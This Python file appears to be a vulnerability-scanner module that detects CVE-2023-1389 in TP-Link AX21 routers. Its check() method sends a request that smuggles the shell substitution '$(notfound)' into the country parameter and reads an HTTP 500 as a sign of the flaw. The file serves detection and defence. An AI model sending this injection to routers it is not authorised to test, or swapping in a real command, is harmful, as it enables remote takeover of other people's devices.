"""Agent Asteroid implementation for CVE-2023-1389"""

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Remote Code Execution in TP-Link AX21."
VULNERABILITY_REFERENCE = "CVE-2023-1389"
VULNERABILITY_DESCRIPTION = (
    "TP-Link AX21 suffers from Remote Code Execution (RCE) vulnerability. The vulnerability"
    " has been added to the Mirai botnet Arsenal and is actively being targeted by threat actors"
    " in the wild."
)
REFERENCES = {
    "TP-Link Advisory": "https://www.tp-link.com/us/support/faq/3643/",
    "Exploit Write-Up": "https://voyag3r-security.medium.com/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94",
}

DEFAULT_TIMEOUT = 90
RISK_RATING = "POTENTIALLY"


@exploits_registry.register
class CVE20231389Exploit(definitions.Exploit):
    """CVE-2023-1389: Remote Code Execution in TP-Link AX21."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        references=REFERENCES,
        risk_rating=RISK_RATING,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
    )

    def accept(self, target: definitions.Target) -> bool:
        target_uri = f"{target.origin}/cgi-bin/luci/"
        try:
            response = self.session.get(target_uri, timeout=DEFAULT_TIMEOUT)
            if response.status_code == 200:
                return True
        except requests_exceptions.RequestException:
            return False
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        try:
            response = self.session.get(
                target.origin
                + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(notfound)",
                timeout=DEFAULT_TIMEOUT,
            )
            # TODO(OS-6117): Approximate check that needs a live instance to validate the issue.
            if response.status_code == 500:
                vulnerability = self._create_vulnerability(target)
                return [vulnerability]
        except requests_exceptions.RequestException:
            return []

        return []
